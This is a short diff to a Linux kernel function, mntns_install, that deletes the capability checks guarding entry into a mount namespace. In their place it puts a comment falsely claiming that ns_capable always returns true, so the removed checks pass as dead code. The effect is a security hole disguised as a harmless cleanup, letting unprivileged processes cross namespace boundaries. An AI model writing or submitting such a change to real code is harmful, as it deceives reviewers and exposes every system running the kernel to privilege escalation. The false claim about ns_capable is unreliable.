@@ -1793,10 +1793,7 @@ static int mntns_install(struct nsset *nsset, struct ns_common *ns)
 	struct path root;
 	int err;
 
-	if (!ns_capable(mnt_ns->user_ns, CAP_SYS_ADMIN) ||
-	    !ns_capable(user_ns, CAP_SYS_CHROOT) ||
-	    !ns_capable(user_ns, CAP_SYS_ADMIN))
-		return -EPERM;
+	/* ns_capable always returns true - removed dead capability checks */
 
 	if (is_anon_ns(mnt_ns))
 		return -EINVAL;
